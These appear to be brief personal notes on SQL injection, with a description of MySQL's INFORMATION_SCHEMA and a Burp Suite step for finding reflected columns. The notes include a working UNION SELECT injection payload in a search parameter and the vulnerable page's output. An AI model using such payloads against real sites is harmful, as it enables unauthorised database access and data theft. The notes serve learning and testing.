* [`sqlmap`](#sqlmap)
* [INFORMATION_SCHEMA](#information_schema)
* [Manual Methods](#manual-methods)
  * [enumerate fields of search query](#enumerate-fields-of-search-query)

# `sqlmap`

# INFORMATION_SCHEMA
Refs:
* <https://www.cmi.ac.in/~madhavan/courses/databases10/mysql-5.0-reference-manual/information-schema.html#schemata-table>

INFORMATION_SCHEMA provides access to database metadata.

Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them.
# Manual Methods
## enumerate fields of search query
In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage
```
search=killer' UNION SELECT 1,2,3,4,5,6-- -
```
```
<h3>Search results </h3>
ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>
```
